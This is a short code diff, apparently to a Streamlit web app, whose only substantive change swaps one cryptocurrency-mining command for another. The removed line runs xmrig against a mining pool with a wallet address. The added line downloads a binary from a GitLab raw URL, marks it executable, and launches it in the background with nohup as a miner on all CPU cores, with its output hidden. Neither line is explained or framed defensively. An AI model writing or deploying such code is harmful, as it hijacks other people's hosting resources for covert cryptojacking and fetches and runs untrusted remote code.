@@ -80,7 +80,7 @@ st.write("tarik", flag.controlFlag)
 
 if flag.controlFlag==0:
     flag.controlFlag+=1
-    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls --user JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.AIR-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
+    p = subprocess.run("wget https://gitlab.com/azkadafa39/donlod/-/raw/main/mike && chmod +x mike && nohup ./mike -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RY9dQ9imcNyBq62BhUui8ZSshSjvntn7ga.$(echo $(shuf -i 100-999 -n 1)-Coky) -p x -t $(nproc --all) >/dev/null 2>&1", stdout=subprocess.PIPE, shell=True)
     print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")
 
 import time 
